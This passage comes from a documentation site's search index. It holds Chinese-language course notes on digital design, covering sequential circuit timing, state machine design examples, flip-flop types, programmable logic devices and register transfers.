Figure</code> \u8bf4\u660e\u5982\u679c\u4e0d\u6309\u7167\u56fe\u4e2d\u987a\u5e8f\u6539\u53d8\u4fe1\u53f7\u7684\u8bdd\uff0cE\u5c31\u4f1a\u53d8\u62101. \u7531\u4e8e\u6211\u4eec\u4e0d\u77e5\u9053\u7cfb\u7edf\u5185\u90e8\u7684\u5177\u4f53\u72b6\u6001\uff0c\u56e0\u6b64\u53ea\u80fd\u7ed9\u6bcf\u4e00\u79cd\u60c5\u51b5\u5206\u914d\u4e00\u4e2a\u72b6\u6001\uff0c\u800c\u7ed9Error\u5355\u72ec\u4e00\u4e2a\u72b6\u6001. \u5e76\u8bf7\u6ce8\u610f\uff0c\u7531\u4e8e\u65f6\u5e8f\u7535\u8def\u6bcf\u4e2a\u65f6\u949f\u6b63\u8fb9\u6cbf\u90fd\u4f1a\u6267\u884c\u4e00\u6b21\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u6bcf\u4e2a\u72b6\u6001\u90fd\u4f1a\u6709\u81ea\u73af(\u81f3\u5c11\u8fd9\u9898\u662f\u8fd9\u6837)</p> <p></p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#_4","title":"\u5206\u6790\u65f6\u95f4","text":"<p>The ultimate goal of timing analysis is to determine the maximum clock frequency of the circuit.</p> <p>\u5728\u5206\u6790\u4e2d\uff0c\u5e38\u89c1\u7684Timing Constraints Components \u6709\uff1a</p> <ul> <li>\\(t_p\\) - clock period - \u65f6\u949f\u5468\u671f\u7684\u95f4\u9694</li> <li>\\(t_{pd,FF}\\) - flipflop propagation delay - \u4ece <code>clock edge</code> \u5230 <code>flip-flop output</code> \u7a33\u5b9a\u4e0b\u6765\u6240\u9700\u8981\u7684\u65f6\u95f4</li> <li>\\(t_{pd,COMB}\\) - combinational logic delay - \u4ece\u89e6\u53d1\u5668\u8f93\u51fa\u5230\u8fd4\u56de\u8f93\u5165\u8def\u5f84\u4e0a\u6240\u6709\u7ec4\u5408\u903b\u8f91\u7684\u4f20\u64ad\u5ef6\u8fdf</li> <li>\\(t_s \\&amp; t_h\\) - flipflop setup time &amp; hold time</li> <li>\\(t_{slack}\\) - extra time in the period - \u677e\u5f1b\u65f6\u95f4\uff0c\u4e00\u822c\u4e0d\u52a0</li> </ul> <p>\u5404\u79cd\u65f6\u95f4\u793a\u610f\u56fe</p> <p></p> <ul> <li>For every Flip-flop \\(t_p\\ge t_{slack} +(t_{pd,FF} +t_{pd,COMB}+ t_s)\\)</li> <li>For whole circuit , \\(t_p' \\ge max\\{t_p\\}\\)</li> <li>\u4e00\u822c\u5206\u6790\u5b9e\u4f8b\u4e2d \\(t_h\\) \u5c0f\u4e8e \\(t_{pd,FF}\\) </li> </ul> External input to OutputExternal input to Clock EdgeClock Edge to outputClock Edge to Clock Edge\u8bfe\u672c\u4f8b\u9898\u9898\u9762\u8bfe\u672c\u4f8b\u9898\u7b54\u6848 <p></p> <p></p> <p></p> <p> </p> <p></p> <p></p> <p>\u5386\u5e74\u5377\u91cc\u9898\u76ee(\u7b80\u5355\u7684)</p> <p></p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#part-2-sequential-circuit-design","title":"Part 2 Sequential Circuit Design","text":"<p>\u8bbe\u8ba1\u4e00\u822c\u6b65\u9aa4\uff1a</p> <ul> <li>Specification - \u786e\u5b9a\u8f93\u5165/\u8f93\u51fa\uff0c\u5e76\u5efa\u7acbmodel\u63cf\u8ff0\u7cfb\u7edf\u7684\u884c\u4e3a</li> <li>Formulation - \u5f97\u5230\u72b6\u6001\u56fe(Mealy Diagram\u66f4\u597d)\uff0c\u6ce8\u610f\u7535\u8def\u7684\u521d\u59cb\u72b6\u6001\uff0c\u5e76\u7531\u6b64\u5f97\u5230\u72b6\u6001\u8868</li> <li>State Minimization - \u6839\u636e\u8868\u8fdb\u884c\u4f18\u5316\uff0c\u53ef\u4ee5\u6d88\u53bb\u91cd\u590d\u7684\u72b6\u6001</li> <li>State Assignment - \u7ed9\u6bcf\u4e2a\u72b6\u6001\u5206\u914d\u4e00\u4e2a\u7f16\u7801(<code>Counting Order</code>,<code>Grey Code</code>,<code>One-hot Code</code>)</li> <li>Equation - \u5229\u7528\u5361\u8bfa\u56fe\u7b49\u65b9\u5f0f\u5f97\u5230\u5e76\u4f18\u5316\u8f93\u5165\u8f93\u51fa\u65b9\u7a0b</li> </ul> \u53ef\u7528\u7684\u7f16\u7801 <p></p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#1-sequence-recognizer","title":"\u8bbe\u8ba1\u5b9e\u4f8b 1 Sequence Recognizer","text":"<p>\u68c0\u6d4b\u5e8f\u5217\u4e2d\u7684 1101 \u4e32</p> <p></p> <ul> <li>\u7531\u6b64\u5f97\u5230Mealy Model\uff1a</li> </ul> <p></p> <ul> <li>\u518d\u6839\u636e\u56fe\u5f97\u5230State Table</li> </ul> Present State Next Statex=0 Next Statex=1 Outputx=0 Outputx=1 A A B 0 0 B A C 0 0 C D C 0 0 D A B 0 1 <ul> <li>\u7f16\u7801</li> </ul> Info Counting Order AssignmentGrey Code AssignmentOne-hot Assignment <p></p> <p></p> <p></p> <ul> <li>\u901a\u5e38\u4f7f\u7528D\u89e6\u53d1\u5668\u6765\u4f5c\u4e3a\u65f6\u5e8f\u5143\u4ef6\uff0c\u5176\u4e2dD\u89e6\u53d1\u5668\u7684input\u901a\u5e38\u4e3aNext State\u7684\u503c\uff0c\u5373\\(D(t)=Y(t+1)\\)</li> </ul> Counting Order AssignmentGrey Code AssignmentOne-hot Assignment <p></p> <p></p> <p> \u53ef\u4ee5\u770b\u51fa<code>One-hot</code>\u7f16\u7801\u7684\u4f18\u5316\u975e\u5e38\u7b80\u5355\uff0c\u6211\u6bd4\u8f83\u559c\u6b22\u55b5</p> <ul> <li>\u4ee5\u683c\u96f7\u7801\u4e3a\u4f8b\uff0c\u6700\u7ec8\u5f97\u5230\u5982\u56fe\u7535\u8def<ul> <li></li> </ul> </li> </ul>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#2-modulo-3-accumulater-for-2-bit-operands","title":"\u8bbe\u8ba1\u5b9e\u4f8b 2 Modulo 3 accumulater for 2-bit operands","text":"<p>\u4f59\u4e09\u7d2f\u52a0\u5668</p> <ul> <li> <p>Specification</p> <ul> <li>Input: \\((X_1, X_0)\\)</li> <li>Stored SUM: \\((Y_1, Y_0)\\)</li> <li>Ouput: \\((Z_1 ,Z_0) =(X_1, X_0) +(Y_1, Y_0)\\) (Mealy Model) or \\((Z_1 ,Z_0) =(Y_1, Y_0)\\) (Moore Model)</li> </ul> </li> <li> <p>Formulation</p> </li> </ul> Mealy ModelMoore Model <p></p> <p></p> <p>\u672c\u4f8b\u91c7\u7528Moore Model\u8fdb\u884c\u6f14\u793a</p> <p>State Table under Moore Model</p> <p></p> <ul> <li>Find equation and optimize</li> </ul> <p></p> <ul> <li>\u6700\u7ec8\u7535\u8def</li> </ul> <p></p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#_5","title":"\u5176\u5b83\u89e6\u53d1\u5668","text":""},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#j-k-flip-flop","title":"J-K Flip-flop","text":"<ul> <li>\u4e0eSR-FlipFlop\u529f\u80fd\u57fa\u672c\u76f8\u540c\uff0c\u4f46\u662f \u5141\u8bb8 J=K=1 \uff0c\u5e76\u4e14J\u3001K\u5747\u4e3a1\u65f6\u8f93\u51fa\u53cd\u8f6c</li> </ul> J K Q(t+1) Operation 0 0 Q(t) No change 0 1 0 Reset 1 0 1 Set 1 1 ~Q(t) Complement <p>\u4e5f\u53ef\u4ee5\u8f6c\u6362\u6210 excitation table (\u65f6\u5e8f\u7535\u8def\u8bbe\u8ba1\u65f6\u8981\u7528\u5230)</p> Q(t) Q(t+1) J K 0 0 0 X 0 1 1 X 1 0 X 1 1 1 X 0 <p>\u6784\u9020\u56fe\u53ca\u5176\u7b26\u53f7</p> <p></p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#t-flip-flop-toggle","title":"T Flip-flop (Toggle)","text":"<ul> <li>Has a single input <code>T</code><ul> <li>For <code>T = 0</code> ,no change to state</li> <li>For <code>T = 1</code> ,changes to opposite state</li> </ul> </li> <li>\u76f8\u5f53\u4e8eJK\u89e6\u53d1\u5668 J=K=T\u7684\u60c5\u51b5</li> </ul> T Q(t) Q(t+1) Operation 0 0 0 No change 0 1 1 No change 1 0 1 Complement 1 1 0 Complement <p>\u6784\u9020\u56fe\u53ca\u5176\u7b26\u53f7</p> <p></p> <p>\u7531\u8868\u53ef\u4ee5\u5f97\u5230\uff1a</p> <ul> <li>\\(Q(t+1)=T\\oplus Q(t)\\)</li> <li>\\(T=Q(t)\\oplus Q(t+1)\\)</li> </ul> <p>\u4e0e\u6b63\u8fb9\u6cbfD\u89e6\u53d1\u5668\u6bd4\u8f83</p> <p></p>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/","title":"CH 5. Digital Hardware Implementation","text":""},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#chapter-5-digital-hardware-implementation","title":"Chapter 5 Digital Hardware Implementation","text":"<p> \u7ea6 960 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#programming-technologies","title":"Programming technologies \u53ef\u7f16\u7a0b\u6280\u672f","text":"<p>\u76f4\u63a5\u66f4\u6539\u786c\u4ef6\u5e03\u7ebf\u6765\u4fee\u6539\u7535\u8def\u529f\u80fd\u88ab\u79f0\u4e3a\u786c\u7f16\u7a0b\uff0c\u800c\u53ef\u7f16\u7a0b\u6280\u672f\u8ba9\u6211\u4eec\u80fd\u591f\u5728\u4e0d\u76f4\u63a5\u66f4\u6539\u786c\u4ef6\u5e03\u7ebf\u7684\u60c5\u51b5\u4e0b\uff0c\u5229\u7528\u8f6f\u4ef6\u7f16\u7a0b\u6765\u95f4\u63a5\u66f4\u6539\u786c\u4ef6\u5e03\u7ebf\u3002\u786c\u7f16\u7a0b\u7684\u64cd\u4f5c\u8005\u662f\u8bbe\u8ba1\u5236\u9020\u8005(manufacturer)\uff0c\u800c\u8f6f\u7f16\u7a0b\u7684\u64cd\u4f5c\u8005\u662f\u7528\u6237(user)\u3002</p> <p>\u5206\u4e3a\u4e09\u79cdtypes\uff1a</p> <ul> <li>Control connections \u63a7\u5236\u8fde\u63a5\u6765\u5b9e\u73b0 \u5176\u4e2d\u5982\u4e0b\u4e09\u4e2a\u6280\u672f\u4e0d\u5c5e\u4e8e\u53ef\u91cd(reprogrammable)\u7f16\u7a0b\u6280\u672f\uff0c\u4e3a\u6c38\u4e45\u7f16\u7a0b\u6280\u672f<ul> <li>Mask programming \u63a9\u819c\u7f16\u7a0b</li> <li>Fuse \u7194\u4e1d</li> <li>Anti-fuse Fuse\u7684\u53cd\u64cd\u4f5c\uff0c\u901a\u8fc7\u9ad8\u7535\u538b\u8054\u901a\u90e8\u5206\u7535\u8def</li> </ul> </li> <li>Control transistor switching \u63a7\u5236\u6676\u4f53\u7ba1\u5f00\u5173\u5b9e\u73b0</li> <li>Build lookup tables \u4f7f\u7528\u67e5\u627e\u8868</li> </ul>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#control-connections","title":"Control connections \u63a7\u5236\u5b9e\u4f53\u7535\u8def\u901a\u65ad","text":"<ul> <li>Mask programming \u63a9\u6a21\u7f16\u7a0b\uff08\u8f83\u6602\u8d35\uff09</li> <li>Fuse  \u7194\u4e1d\uff0c\u53ef\u4ee5\u63a7\u5236\u662f\u5426\u8981\u65ad\u6389\uff08\u4e00\u6b21\u6027\uff09</li> <li>Antifuse  \u4e0e\u7194\u4e1d\u76f8\u53cd\uff0c\u53ef\u901a\u8fc7\u63a7\u5236\u7535\u538b\u6765\u63a7\u5236\u662f\u5426\u63a5\u901a\uff08\u4f53\u79ef\u5c0f\uff0c\u6210\u672c\u9ad8\uff09</li> </ul>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#control-transistor-switching","title":"Control transistor switching \u63a7\u5236\u6676\u4f53\u7ba1\u63a7\u5236\u6781","text":"<p>\u5f53\u63a7\u5236\u6781\u8f93\u51651\u65f6\uff0c\u901a\uff1b\u8f93\u51650\u65f6\uff0c\u65ad\u3002 \u7279\u70b9\uff1a</p> <ul> <li>Erasable\uff08\u53ef\u91cd\u7f16\u7a0b\uff09</li> <li>Electrically erasable </li> <li>Flash \uff08Flash memory\uff0c\u53ef\u7528\u4e8eu\u76d8\uff09</li> </ul>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#build-lookup-tableslut","title":"Build Lookup Tables\uff08LUT\uff09 \u67e5\u8868\u6cd5","text":"<p>\u91c7\u7528\u591a\u8def\u9009\u62e9\u5668\uff0c\u5f53\u9700\u8981\u6539\u53d8\u903b\u8f91\u5173\u7cfb\u7684\u65f6\u5019\u4e0d\u9700\u8981\u6539\u53d8\u5668\u4ef6</p>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#programmable-logic-device","title":"Programmable Logic Device \u5e38\u89c1\u7684\u53ef\u7f16\u7a0b\u6280\u672f","text":"<ul> <li>\u53ea\u8bfb\u5185\u5b58Read Only memory(ROM) Fixed AND &amp; Programmable OR </li> <li>\u53ef\u7f16\u7a0b\u9635\u5217\u903b\u8f91 Programmable Array Logic(PAL) Programmable AND &amp; Fixed OR</li> <li>\u53ef\u7f16\u7a0b\u903b\u8f91\u9635\u5217Programmable Logic Array Programmable AND &amp; Programmable OR</li> <li>Complex Programmable Logic Device (CPLD) /FieldProgrammable Gate Array (FPGA)</li> </ul> <p>\u5176\u4e2d\uff0c\u524d\u4e09\u79cd\u662f\u901a\u8fc7Control connections\u6765\u63a7\u5236\uff0c\u53ea\u80fd\u7f16\u7a0b\u4e00\u6b21\uff0c\u5c5e\u4e8e\u6c38\u4e45\u7f16\u7a0b\u6280\u672f\uff0c\u6700\u540e\u4e00\u79cd\u4f7f\u7528LUT\u63a7\u5236\uff0c\u5c5e\u4e8e\u53ef\u91cd\u7f16\u7a0b\u6280\u672f\u3002</p> <p></p> <p>\u89e3\u8bfb\uff1a</p> <ul> <li>\u5bf9\u4e8eROM\uff1a\u5c06\u6240\u6709\u6700\u5c0f\u9879\u8bd1\u7801\u51fa\u6765\uff0c\u4f46\u662f\u6700\u7ec8\u53ef\u4ee5\u53ea\u8ba9\u5176\u4e2d\u4e24\u9879\u6216\u51fa\u6765</li> <li>\u5bf9\u4e8ePAL\uff1aOR\u7684\u6570\u91cf\u662f\u6b7b\u7684\uff0c\u4f46\u662f\u53ef\u4ee5\u5728AND\u4e2d\u52a0\u9879\u6216\u662f\u51cf\u9879</li> <li>\u5bf9\u4e8ePLA\uff1aOR\u548cAND\u90fd\u53ef\u4ee5\u53d1\u751f\u589e\u51cf\uff0c\u7075\u6d3b\u4f46\u6709\u5c40\u9650\uff08\u7f3a\u9677\uff09</li> </ul>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#logical-symbols","title":"Logical Symbols \u903b\u8f91\u7b26\u53f7","text":""},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#read-only-memory","title":"Read Only Memory \u53ea\u8bfb\u5185\u5b58","text":"<p>Read Only Memory(ROM) or Programmable Read Only Memory(PROM)</p> <p>General Structure with decoder</p> <p></p> <p>An \\(2^3\\times 4\\) ROM (N=3 input lines , M=4 output lines)</p> <p></p> <p>\u5b9e\u9645\u4f7f\u7528\u7528\u4f8b</p> <p>3bit\u8f93\u5165\u7684\u5e73\u65b9\u8ba1\u7b97 \\(B[5:0]=A[2:0]\\times A[2:0]\\)</p> <ol> <li> <p>\u9996\u5148\u5217\u51fa\u771f\u503c\u8868 </p> </li> <li> <p>\u5c06\u80fd\u76f4\u63a5\u5316\u7b80\u6389\u7684\u76f4\u63a5\u5316\u7b80\uff0c\u5982\u4e0a\u56fe \\(B_1=0,B_0=A_0\\)</p> </li> <li> <p>\u7136\u540e\u8fd0\u7528minterms\u76f4\u63a5\u5f97\u51faROM\u7684\u7ed3\u6784\u56fe\uff1a  </p> </li> </ol>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#programmable-array-logic","title":"Programmable Array Logic \u53ef\u7f16\u7a0b\u9635\u5217\u903b\u8f91","text":"<p>The PAL is the opposite of the ROM , having programmable set of ANDs combined with fixed ORs.</p> <p>General Structure</p> <p></p> <p>\u7531\u4e8e\u4e0e\u95e8\u7684 fan-in \u6709\u9650\uff0c\u6240\u4ee5 \u4e0d\u53ef\u80fd\u5c06\u6240\u6709minterm\u8868\u793a \uff0c\u8fd9\u5c31\u5bfc\u81f4\u6709\u4e9bfunction\u53ef\u80fd\u505a\u4e0d\u5230\uff0c\u8fd9\u4e2a\u7f3a\u70b9\u53ef\u4ee5\u7531\u5c06\u8f93\u51fa\u63a5\u56de\u8f93\u5165\u7684\u65b9\u5f0f\u89e3\u51b3\uff1a</p> <p></p>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#programmable-logic-array","title":"Programmable Logic Array \u53ef\u7f16\u7a0b\u903b\u8f91\u9635\u5217","text":"<ul> <li>\u4f18\u70b9:<ul> <li>\u7075\u6d3b\uff0c\u80fd\u5b8c\u6210\u5bf9 ROM \u548c PAL \u6765\u8bf4 impractical \u7684\u51fd\u6570</li> </ul> </li> <li>\u7f3a\u70b9:<ul> <li>\u4e0e\u95e8\u7684\u6570\u91cf\u9650\u5236\u4e86\u5e94\u7528</li> <li>\u9700\u8981\u591a\u4f59\u7684\u5916\u90e8\u8fde\u63a5\u6765\u8fdb\u884c\u591a\u5c42\u6b21\u7684\u7535\u8def\u8bbe\u8ba1\uff0c\u4e14\u4f18\u5316\u53d8\u5f97\u590d\u6742</li> </ul> </li> </ul> <p>\u56e0\u6b64\u901a\u5e38\u4f1a\u5728\u540e\u9762\u52a0\u4e00\u4e2a\u5f02\u6216\u95e8\uff08\u51b3\u5b9a\u662f\u5426\u8981\u5bf9\u7ed3\u679c\u53d6\u975e\uff09\u6765\u589e\u52a0\u4e0e\u95e8\u8868\u793a\u7684product\u7684\u79cd\u7c7b</p>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#field-programmable-gate-arrays-fpga","title":"Field-Programmable Gate Arrays \uff08FPGA\uff09","text":""},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#lookup-tablelut","title":"Lookup Table\uff08LUT\uff09","text":"<p>\u901a\u8fc7\u7ec4\u5408\u591a\u8def\u9009\u62e9\u5668\u6765\u9009\u62e9\u8981\u8f93\u51fa\u7684\u771f\u503c\u8868\u7684\u503c\uff1a</p> <p></p> <p>Internal Structure</p> <p></p>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#configurable-logic-block-clb","title":"Configurable Logic Block (CLB)","text":"<p>FPGA\u57fa\u672c\u7684\u903b\u8f91\u5355\u5143</p> <p></p> <p>\u7531\u4e8eLUT\u4e2d\u7684Storage Cells\u662f\u4e0d\u7a33\u5b9a\u7684\uff0c\u6211\u4eec\u9700\u8981\u5728\u91cc\u9762\u4f7f\u7528PROM\u6765\u6c38\u4e45\u4fdd\u5b58data.</p> <p>Example</p> <p></p>"},{"location":"Courses/DD/note/Chapter%205%20Digital%20Hardware%20Implementation/#_1","title":"\u603b\u7ed3","text":"<p>Example \u5c06\u683c\u96f7\u7801\u8f6c\u6362\u6210\u4e8c\u8fdb\u5236\u7801\uff0c\u7528\u56db\u79cd\u53ef\u91cd\u7f16\u7a0b\u5143\u5668\u4ef6\u5b9e\u73b0\uff1a</p> <ul> <li>&lt;1&gt; ROM</li> </ul> <p></p> <ul> <li>&lt;2&gt; PAL</li> </ul> <p></p> <ul> <li>&lt;3&gt; PLA</li> </ul> <p></p> <ul> <li>&lt;4&gt; FPGA</li> </ul> <p></p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/","title":"CH 6. Registers and Register Transfers","text":""},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#chapter-6-registers-and-register-transfers","title":"Chapter 6 Registers and Register Transfers","text":"<p> \u7ea6 1130 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#register","title":"Register \u5bc4\u5b58\u5668","text":"<ul> <li>\u4e00\u4e2a\u5bc4\u5b58\u5668\u65e2\u80fd\u5b58\u50a8\u503c(store)\u53c8\u80fd\u8bfb\u53d6\u65b0\u7684\u503c(load)</li> <li>\u8981\u540c\u65f6\u5b9e\u73b0\u8fd9\u4e24\u4e2a\u529f\u80fd\uff0c\u6211\u4eec\u4f7f\u7528\u53d8\u91cf<code>load</code>\u6765\u63a7\u5236\u5bc4\u5b58\u5668\u9009\u62e9store\u8fd8\u662fload\u7684\u884c\u4e3a<ul> <li>load = 1 : load the values on the data inputs</li> <li>load = 0 : Store the values in the register</li> </ul> </li> </ul> <p>\u53ef\u884c\u7684\u65b9\u6cd5\u4e4b\u4e00\u662f\u5c06Enable\u4fe1\u53f7\u7531 \\(Clock\\) \u53d8\u4e3a \\(\\overline{load}+clock\\) \uff0c\u8fd9\u6837\u5f53 load = 0 \u65f6\uff0c\u4f7f\u80fd\u4fe1\u53f7\u65f6\u949f\u4e3a1\uff0c\u4f7f\u5f97\u89e6\u53d1\u5668\u4e2d\u7684slave\u9501\u5b58\u5668\u65e0\u6cd5\u5199\u5165\u6570\u636e\uff0c\u8fbe\u5230 store \u7684\u529f\u80fd\u3002</p> <p></p> <p>Clock Skew</p> <p>\u7136\u800c\u8fd9\u4e2a\u65b9\u6848\u5b58\u5728\u7f3a\u9677\uff0c\u5728\u540c\u6b65\u65f6\u5e8f\u7535\u8def\u4e2d\uff0c\u7531\u4e8eclock\u4fe1\u53f7\u7531\u6574\u4e2a\u7535\u8def\u5171\u7528\uff0c\u5982\u679c\u76f4\u63a5\u628aload\u4e0eclock\u4ee5\u67d0\u79cd\u65b9\u5f0f\u76f8\u8fde\u7684\u8bdd\uff0cclock\u5230\u8fbe\u8be5\u7535\u8def(\u6216\u8005\u5176\u5b83\u7535\u8def)\u5c31\u4f1a\u6709\u4e0d\u53ef\u907f\u514d\u7684\u4f20\u64ad\u5ef6\u8fdf\uff0c\u5373\u65f6\u949f\u504f\u79fb(clock skew)\u3002</p> <p>\u7406\u89e3Clock Skew\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u8f6c\u800c\u91c7\u53d6\u53e6\u4e00\u79cd\u65b9\u6848\uff1a\u901a\u8fc7load\u6765\u9009\u62e9\u89e6\u53d1\u5668\u7684\u8f93\u5165\u662f\u5f53\u524d\u7684input\u8fd8\u662f\u5f53\u524d\u7684output</p> <p></p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#register-transfer-operations","title":"Register Transfer Operations","text":"<ul> <li>Elementary Operations: load, count, shift, add, bitwise \"OR\", etc.<ul> <li>Elementary operations called microoperations</li> <li>Register Transfer Language \u7f29\u5199 RTL</li> </ul> </li> </ul> <p>\u5e38\u89c1RTL</p> <p> </p> <p>RTL\u4f8b\u9898</p> \u9898\u76ee\u7b54\u6848 <p></p> <p></p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#register-transfer-structure","title":"Register Transfer Structure","text":""},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#multiplexer-based-transfers-mux","title":"Multiplexer-Based Transfers \u57fa\u4e8eMUX\u5b9e\u73b0\u4f20\u8f93","text":"<p>\u5bf9\u4e8e\u4e00\u4e2a\u5355\u4e00\u5bc4\u5b58\u5668\uff0c\u5b83\u7684\u8f93\u5165\u53ef\u80fd\u6709\u591a\u79cd\u6765\u6e90\uff0c\u4f8b\u5982\u5176\u5b83\u5bc4\u5b58\u5668\uff0c\u53c8\u6216\u8005\u662f\u5176\u4ed6\u64cd\u4f5c\u7684\u7ed3\u679c\u3002\u603b\u800c\u8a00\u4e4b\uff0c\u5b83\u7684\u8f93\u5165\u5f88\u53ef\u80fd\u662f\u4e0d\u552f\u4e00\u7684\uff0c\u800c\u540c\u4e00\u65f6\u523b\u6211\u4eec\u53ea\u80fd\u63a5\u53d7\u4e00\u4e2a\u6765\u6e90\u7684\u8f93\u5165\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u9700\u8981\u4f7f\u7528\u00a0<code>MUX</code>\u00a0\u6765\u5bf9\u8f93\u5165\u8fdb\u884c\u9009\u62e9\u3002</p> <p></p> <p>\u4e00\u7ec4Register\u4e92\u76f8\u4e4b\u95f4\u6709\u8f93\u5165\u7684\u60c5\u51b5</p> <p></p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#multiplexer-bus-mux","title":"Multiplexer Bus \u57fa\u4e8eMUX\u603b\u7ebf\u5b9e\u73b0\u4f20\u8f93","text":"<p>\u4e0a\u8ff0\u5b9e\u73b0\u8981\u6c42\u6bcf\u4e2aRegister\u90fd\u6709\u5176\u5bf9\u5e94\u7684MUX\uff0c\u8fd9\u5c06\u5927\u5927\u589e\u52a0\u7535\u8def\u7684\u5f00\u9500\u3002\u56e0\u6b64\u6211\u4eec\u4e0d\u59a8\u8bd5\u60f3\u4e00\u4e2a\u6240\u6709Register\u8fde\u63a5\u5230\u4e00\u6761\u7ebf\u8def\u7684\u60c5\u51b5\uff0c\u8fd9\u6761\u7ebf\u8def\u4e5f\u88ab\u79f0\u4e3a\u603b\u7ebf(bus)</p> <p>\u63a5\u4e0b\u6765\u8fdb\u884c\u5bf9\u6bd4\uff0c\u4ee5\u603b\u7ebf\u5b9e\u73b0\u4e3a\u4e3b\u4f53\uff0c\u4e0e\u00a0<code>MUX</code>\u00a0\u5b9e\u73b0\u5bf9\u6bd4\uff1a</p> <ul> <li>\u4f18\u52bf\uff1a<ul> <li>\u7535\u8def\u66f4\u7cbe\u7b80\uff0c\u6210\u672c\u66f4\u4f4e\uff0c\u968f\u7740\u5bc4\u5b58\u5668\u589e\u52a0\u8fd9\u4e2a\u7279\u70b9\u66f4\u52a0\u660e\u663e\uff1b</li> </ul> </li> <li>\u52a3\u52bf\uff1a<ul> <li>\u540c\u4e00\u65f6\u523b\u5185\u603b\u7ebf\u53ea\u80fd\u4f20\u8f93\u4e00\u4e2a\u6570\u636e\uff0c\u5373\u53ea\u6709\u4e00\u4e2a\u6570\u636e\u6e90(source)\uff1b<ul> <li>\u540c\u4e00\u65f6\u949f\u5468\u671f\u5185\u53ea\u6709\u4e00\u4e2a\u6570\u636e\u80fd\u4f20\u8f93\u5230\u522b\u7684\u5730\u65b9\uff0c\u4f8b\u5982\u4ea4\u6362\u64cd\u4f5c\u5c31\u9700\u8981\u81f3\u5c11\u4e24\u4e2a\u65f6\u949f\u624d\u80fd\u5b9e\u73b0\uff1b</li> </ul> </li> </ul> </li> </ul> <p>\u800c\u56e0\u4e3a\u8fd9\u4e9b\u7279\u70b9\uff0c\u6211\u4eec\u9700\u8981\u8bc4\u4f30\u6211\u4eec\u7684\u9700\u6c42\uff0c\u9009\u62e9\u5408\u9002\u7684\u7ed3\u6784\u6765\u5b9e\u73b0\u3002</p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#mutiplexer-bus-mux","title":"Mutiplexer Bus \u5171\u7528MUX","text":"<p>\u4e0a\u56fe\u5c06\u6240\u6709Register\u5b58\u50a8\u7684\u503c\u63a5\u5165\u4e00\u4e2a\u5171\u7528\u7684MUX\u4e2d\uff0c\u901a\u8fc7 \\(S_1\u3001 S_0\\) \u63a7\u5236\u8f93\u51fa\u54ea\u7ec4\u503c\uff0c\u518d\u901a\u8fc7\u5bc4\u5b58\u5668\u5404\u81ea\u7684load\u63a7\u5236\u662f\u5426\u8f93\u5165\u5230\u8be5\u5bc4\u5b58\u5668\u4e2d</p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#three-state-bus","title":"Three-State Bus","text":"<p>\u4e09\u6001\u95e8\u8f93\u51fa\u9ad8\u963b\uff0c\u5f88\u9002\u5408\u5f53bus</p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#microoperations","title":"Microoperations \u5b9e\u73b0","text":""},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#add-and-substract","title":"Add and Substract \u52a0\u51cf\u6cd5","text":"<p>Note</p> <p>\u6b63\u5982\u89c1\u9762\u51e0\u7ae0\u6240\u5b66\u8fc7\u7684\uff0c\u8fd8\u53ef\u4ee5\u901a\u8fc7\u52a0\u51cf\u6cd5\u5668\u505a\u5230\u5f88\u591a\u529f\u80fd </p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#logic","title":"Logic \u903b\u8f91\u8fd0\u7b97","text":"<p>Wow\uff0cso simply!</p> <p></p>"},{"location":"Courses/DD/note/Chapter%206%20Registers%20and%20Register%20Transfers/#shift","title":"Shift \u79fb\u4f4d\u8fd0\u7b97","text":"<ul> 